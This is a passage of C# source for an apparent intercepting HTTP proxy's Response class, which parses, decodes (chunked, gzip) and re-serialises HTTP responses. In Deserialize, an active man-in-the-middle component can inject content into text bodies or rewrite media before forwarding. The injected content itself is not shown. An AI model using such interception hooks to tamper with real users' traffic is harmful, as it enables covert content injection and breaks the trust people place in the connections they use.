    }

    public class Response : IDisposable, IFilter
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                filterNames.Clear();
                filterNames = null;
                _vfmanager = null;
                fullText = null;
                Array.Clear(fullBytes, 0, fullBytes.Length);
                fullBytes = null;
                version = null;
                statusCode = 0;
                httpMessage = null;
                headers.Clear();
                headers = null;
                Array.Clear(body, 0, body.Length);
                bodyText = null;
                console = null;
            }

            disposed = true;
        }

        //IFilter Implementation

        private Dictionary<string, object> filterNames = new Dictionary<string, object>();
        private VFilter _vfmanager;

        public Dictionary<string, object> filterName
        {
            get { return filterNames; }
            set { filterNames = value; }
        }

        public VFilter manager
        {
            get { return _vfmanager; }
            set { _vfmanager = value; }
        }

        public string PushBindInfo()
        {
            string info = "";

            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                string part2 = kvp.Value.ToString();
                info += kvp.Key + ":" + part2 + ";";
            }

            if (info.Length > 0) info = info.Substring(0, info.Length - 1);

            return info;
        }

        public void PullBindInfo(string info)
        {
            if (info == "") return;
            String[] kvp = info.Split(';');
            foreach (String pairs in kvp)
            {
                string[] kvp2 = pairs.Split(':');
                string level = kvp2[1].ToString();
                string name = kvp2[0];
                filterNames.Add(name, level);
            }
        }

        public bool BindFilter(string validFilterName, object input)
        {
            string op = (string)input;
            if (op != "mime_white_list" && op != "mime_skip_list") return false;
            filterNames.Add(validFilterName, op);
            return true;
        }

        public bool SearchFilter(string sMethod, object searchParam, string input)
        {
            string p = (string)searchParam;
            string targetFilterName = "";
            foreach (KeyValuePair<string, object> pair in filterNames)
            {
                string comp = (string)pair.Value;
                if (comp == p)
                {
                    targetFilterName = pair.Key;
                    break;
                }
            }

            if (targetFilterName == "")
            {
                return true; // if target filter is not found output the text, perhaps there is no filter for a specific object
            }

            if (sMethod == "and")
            {
                return manager.RunAllCompareAnd(targetFilterName, input);
            }
            else if (sMethod == "or")
            {
                return manager.RunAllCompareOr(targetFilterName, input);
            }
            else
            {
                console.WriteLine("[ERROR] Invalid SearchFilter option sMethod", console.GetIntercativeGroup());
                return true;
            }
        }

        public bool UnBindFilter(string validFilterName)
        {
            if (!filterName.ContainsKey(validFilterName)) return false;
            filterName.Remove(validFilterName);
            return true;
        }

        public void BindList()
        {
            WriteLine("=========Start Of bind list=========");
            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                string ll = (string)kvp.Value;
                WriteLine(kvp.Key + ":\t" + ll);
            }
            WriteLine("==========End Of bind list==========");
        }

        public void SetManager(VFilter fman)
        {
            manager = fman;
        }

        //Main response parser class

        public string fullText { get; private set; } = "";
        public byte[] fullBytes { get; private set; }
        public string version = "";
        public int statusCode = 0;
        public string httpMessage = "";
        public VDictionary headers = new VDictionary();
        public byte[] body = new byte[2048];
        public string bodyText = "";
        private VConsole console;
        private byte[] rStore;
        public bool notEnded = false;
        public bool bogus = false;
        public bool isChunked = false;
        private int dataWritten = 0;
        public bool skip = false;
        private VMitm mitm;

        public Response(string result, byte[] rBytes, VConsole con, VMitm mitmHttp)
        {
            fullText = result;
            fullBytes = rBytes;
            console = con;
            mitm = mitmHttp;
        }

        public void WriteLine(string text)
        {
            console.WriteLine(text, "ig.null"); // this class don't have interactive mode, so always write to ig.null
        }

        private void DecodeArray()
        {
            notEnded = false;
            string cType = headers["Content-Type"];
            VDecoder vd = new VDecoder();
            bool isConvertable = false;
            if (filterNames.Count > 0)
            {
                isConvertable = SearchFilter("or", "mime_white_list", cType);
            }
            if (isConvertable && !headers.ContainsKey("Content-Encoding"))
            {
                bodyText = vd.DecodeCharset(cType, body, body.Length);
            }
            else if (isConvertable && headers.ContainsKey("Content-Encoding"))
            {
                string enc = headers["Content-Encoding"];
                if (enc == "gzip") body = vd.DecodeGzipToBytes(body);

                bodyText = vd.DecodeCharset(cType, body, body.Length);
                //IMPORTANT: Use push end -- the data is converted to text correctly
            }
            else if (!isConvertable && headers.ContainsKey("Content-Encoding"))
            {
                //Decode contents to byte arra
                string enc = headers["Content-Encoding"];
                if (enc == "gzip") body = vd.DecodeGzipToBytes(body);
            }
            else
            {
                //Data is in clearText, not convertable to printable (text) format for ex. image file, exe file
                bodyText = "";
            }
        }

        public void PushEnd(byte[] rawData)
        {
            //rawData itself is not a gzip stream
            if (!notEnded) return;
            if (notEnded && isChunked)
            {
                byte[] concat = DecodeChunk(rawData);
                byte[] temp = new byte[rStore.Length];
                Array.Copy(rStore, temp, rStore.Length);
                rStore = new byte[concat.Length + temp.Length];
                Array.Copy(temp, rStore, temp.Length);
                Array.ConstrainedCopy(concat, 0, rStore, temp.Length, concat.Length);
                dataWritten += concat.Length;
                if (Encoding.ASCII.GetString(concat).EndsWith("\r\n\r\n"))
                {
                    //End of chunked stream
                    body = rStore;
                    DecodeArray();
                }

                return;
            }
            int ctLength = int.Parse(headers["Content-Length"]);
            console.Debug("Content length is: " + ctLength.ToString());
            Array.ConstrainedCopy(rawData, 0, rStore, dataWritten, rawData.Length);
            dataWritten += rawData.Length;
            if (dataWritten == ctLength)
            {
                console.Debug("check passed!");
                body = rStore;
                //Array.Clear(rStore, 0, rStore.Length);
                DecodeArray();
            }
        }

        private byte[] DecodeChunk(byte[] inputData)
        {
            byte[] result = null;

            int chunkLength = 0;
            int prevEnd = 0;

            for (int i = 0; i < inputData.Length; i++)
            {
                if (chunkLength == 0)
                {
                    byte chr = inputData[i];
                    char c = Convert.ToChar(chr);

                    if (c == '\r')
                    {
                        byte[] lData = new byte[i - prevEnd];
                        Array.ConstrainedCopy(inputData, prevEnd, lData, 0, i - prevEnd);
                        if (lData.Length == 1 && lData[0] == 0) return result;
                        chunkLength = int.Parse(Encoding.ASCII.GetString(lData), System.Globalization.NumberStyles.HexNumber);
                        prevEnd += lData.Length + 2;
                        continue;
                    }
                }
                else
                {
                    if (result == null)
                    {
                        result = new byte[chunkLength];
                        Array.ConstrainedCopy(inputData, prevEnd, result, 0, chunkLength);
                    }
                    else
                    {
                        byte[] tmp = new byte[result.Length];
                        Array.Copy(result, tmp, result.Length);
                        result = new byte[tmp.Length + chunkLength];
                        Array.Copy(tmp, result, tmp.Length);
                        Array.ConstrainedCopy(inputData, prevEnd, result, tmp.Length, chunkLength);
                    }

                    i += chunkLength;
                    prevEnd = i;
                    chunkLength = 0;
                }
            }

            return result;
        }

        public void Serialize()
        {
            try
            {
                if (fullText == "" && fullBytes.Length == 0) return;
                String[] lines = fullText.Split('\n');
                string firstLine = lines[0];
                //Console.WriteLine(firstLine + " " + notEnded.ToString());
                int firstSpace = firstLine.IndexOf(' ');
                int secondSpace = firstLine.IndexOf(' ', firstSpace + 1);
                version = firstLine.Substring(0, firstSpace);
                statusCode = int.Parse(firstLine.Substring(firstSpace, secondSpace - firstSpace));
                httpMessage = firstLine.Substring(secondSpace + 1).Replace("\r", "");
                firstLine = null;
                bool headersCompleted = false;
                int chrIndex = httpMessage.Length + version.Length + statusCode.ToString().Length + 1 + 2;
                for (int i = 1; i < lines.Length; i++)
                {
                    string line = lines[i].Replace("\r", String.Empty);
                    if (!headersCompleted) chrIndex += lines[i].Length + 1;
                    if (line == "")
                    {
                        headersCompleted = true;
                        chrIndex += 1;
                        continue;
                    }
                    if (!headersCompleted)
                    {
                        string hName = line.Substring(0, line.IndexOf(':'));
                        string hVal = line.Substring(line.IndexOf(':') + 2);
                        headers.Add(hName, hVal);
                    }
                    else
                    {
                        break;
                        //notEnded = false; // if loop doesn't enter here, because the body is sent in a separate packet then it's not ended! :)
                        //if (headers.ContainsKey("Content-Type"))
                        //{
                        //    if (filterNames.Count > 0)
                        //    {
                        //        if (SearchFilter("or", "mime_skip_list", headers["Content-Type"]))
                        //        {
                        //            skip = true;
                        //            return;
                        //        }
                        //    }
                        //}

                        //if (headers.ContainsKey("Content-Length"))
                        //{
                        //    int cLength = int.Parse(headers["Content-Length"]);
                        //    console.Debug("prev + content length = " + (cLength + chrIndex).ToString());
                        //    console.Debug("fullbytes length: " + fullBytes.Length);
                        //    if ((cLength + chrIndex) != fullBytes.Length)
                        //    {
                        //        notEnded = true;
                        //        rStore = new byte[cLength];
                        //        //Array.Copy(fullBytes, rStore, fullBytes.Length);
                        //        Array.ConstrainedCopy(fullBytes, chrIndex, rStore, 0, fullBytes.Length - chrIndex);
                        //        dataWritten = fullBytes.Length - chrIndex;
                        //        //prev. decoding rStore with gzip
                        //        // IMPORTANT: here the gzip decode is running fine!
                        //        return;
                        //    }
                        //    else
                        //    {
                        //        body = new byte[fullBytes.Length - chrIndex];
                        //        Array.ConstrainedCopy(fullBytes, chrIndex, body, 0, fullBytes.Length - chrIndex);
                        //        DecodeArray();
                        //    }
                        //    break;
                        //}
                        //else if (!headers.ContainsKey("Content-Length") && headers.ContainsKey("Transfer-Encoding"))
                        //{
                        //    //https://en.wikipedia.org/wiki/Chunked_transfer_encoding -- only can decode (gzip, deflate) after the chunks are concatanated
                        //    string te = headers["Transfer-Encoding"];
                        //    if (te == "chunked")
                        //    {
                        //        byte[] chunk = new byte[fullBytes.Length - chrIndex];
                        //        Array.ConstrainedCopy(fullBytes, chrIndex, chunk, 0, fullBytes.Length - chrIndex);
                        //        byte[] concat = DecodeChunk(chunk);
                        //        rStore = new byte[concat.Length];
                        //        Array.Copy(concat, rStore, concat.Length);
                        //        if (Encoding.ASCII.GetString(chunk).EndsWith("\r\n\r\n"))
                        //        {
                        //            body = rStore;
                        //            DecodeArray();
                        //        }
                        //        else
                        //        {
                        //            notEnded = true;
                        //            isChunked = true;
                        //            dataWritten = concat.Length;
                        //        }
                        //    }

                        //    break;
                        //}
                    }
                }

                if (headers.ContainsKey("Content-Type"))
                {
                    string cType = headers["Content-Type"];
                    if (cType.Contains(";")) cType = cType.Split(';')[0];

                    if (filterNames.Count > 0)
                    {
                        if (SearchFilter("or", "mime_skip_list", cType))
                        {
                            skip = true;
                            return;
                        }
                    }
                }

                if (headers.ContainsKey("Content-Length"))
                {
                    int cLength = int.Parse(headers["Content-Length"]);
                    console.Debug("prev + content length = " + (cLength + chrIndex).ToString());
                    console.Debug("fullbytes length: " + fullBytes.Length);
                    if ((cLength + chrIndex) != fullBytes.Length)
                    {
                        notEnded = true;
                        rStore = new byte[cLength];
                        //Array.Copy(fullBytes, rStore, fullBytes.Length);
                        if (fullBytes.Length - chrIndex != - 1)
                        {
                            Array.ConstrainedCopy(fullBytes, chrIndex, rStore, 0, fullBytes.Length - chrIndex);
                            dataWritten = fullBytes.Length - chrIndex;
                        }
                        else
                        {
                            dataWritten = 0;
                        }
                        //prev. decoding rStore with gzip
                        // IMPORTANT: here the gzip decode is running fine!
                        return;
                    }
                    else
                    {
                        body = new byte[fullBytes.Length - chrIndex];
                        Array.ConstrainedCopy(fullBytes, chrIndex, body, 0, fullBytes.Length - chrIndex);
                        DecodeArray();
                    }
                }
                else if (!headers.ContainsKey("Content-Length") && headers.ContainsKey("Transfer-Encoding"))
                {
                    //https://en.wikipedia.org/wiki/Chunked_transfer_encoding -- only can decode (gzip, deflate) after the chunks are concatanated
                    string te = headers["Transfer-Encoding"];
                    if (te == "chunked")
                    {
                        byte[] chunk = new byte[fullBytes.Length - chrIndex];
                        Array.ConstrainedCopy(fullBytes, chrIndex, chunk, 0, fullBytes.Length - chrIndex);
                        byte[] concat = DecodeChunk(chunk);
                        rStore = new byte[concat.Length];
                        Array.Copy(concat, rStore, concat.Length);
                        if (Encoding.ASCII.GetString(chunk).EndsWith("\r\n\r\n"))
                        {
                            body = rStore;
                            DecodeArray();
                        }
                        else
                        {
                            notEnded = true;
                            isChunked = true;
                            dataWritten = concat.Length;
                        }
                    }
                }

                //Serialize completed yay! :)
            }
            catch (Exception ex)
            {
                Console.WriteLine("Serialize error: " + ex.Message);
                Console.WriteLine("St: " + ex.StackTrace);
                bogus = true;
            }
        }

        public void Deserialize(NetworkStream ns, Request req, VSslHandler vsh = null)
        {
            string sResult = version + " " + statusCode + " " + httpMessage + "\r\n";
            int ctLength = 0;

            //edit bodyText here

            VDecoder vd = new VDecoder();

            if (mitm != null && mitm.started)
            {
                if (bodyText != "")
                {
                    if (mitm.CheckBody(bodyText)) return;
                    string cType = (headers.ContainsKey("Content-Type")) ? headers["Content-Type"] : null;
                    if (cType != null)
                    {
                        string nt = "";
                        nt = mitm.Inject(bodyText, headers["Content-Type"]);
                        if (nt != null) bodyText = nt;
                    }
                }
                else
                {
                    byte[] n = mitm.MediaRewrite(this, req);
                    if (n != null) body = n;
                }
            }

            if (bodyText != "" && headers.ContainsKey("Content-Encoding"))
            {
                Array.Clear(body, 0, body.Length);
                byte[] toCode = vd.EncodeCharset(headers["Content-Type"], bodyText);
                body = vd.EncodeGzip(toCode);
                Array.Clear(toCode, 0, toCode.Length);
            }
            else if (bodyText == "" && headers.ContainsKey("Content-Encoding"))
            {
                body = vd.EncodeGzip(body);
            }
            else if (bodyText != "" && !headers.ContainsKey("Content-Encoding"))
            {
                body = vd.EncodeCharset(headers["Content-Type"], bodyText);
            }

            ctLength = body.Length;

            foreach (KeyValuePair<string, string> kvp in headers.Items)
            {
                string line = "";
                if (kvp.Key == "Content-Length") line = "Content-Length: " + ctLength + "\r\n";
                else if (kvp.Key == "Transfer-Encoding" && kvp.Value == "chunked")
                {
                    // insert the content-length and skip the transfer-encoding header, because we concatanated it.
                    line = "Content-Length: " + ctLength.ToString() + "\r\n";
                }
                else line = kvp.Key + ": " + kvp.Value + "\r\n";

                sResult += line;
            }

            sResult += "\r\n";

            byte[] text = Encoding.ASCII.GetBytes(sResult);
            if (vsh == null)
            {
                ns.Write(text, 0, text.Length);
                ns.Write(body, 0, body.Length);
                ns.Flush();
            }
            else
            {
                vsh.WriteSslStream(text);
                vsh.WriteSslStream(body);
                vsh.FlushSslStream();
            }
        }
    }

    #endregion
}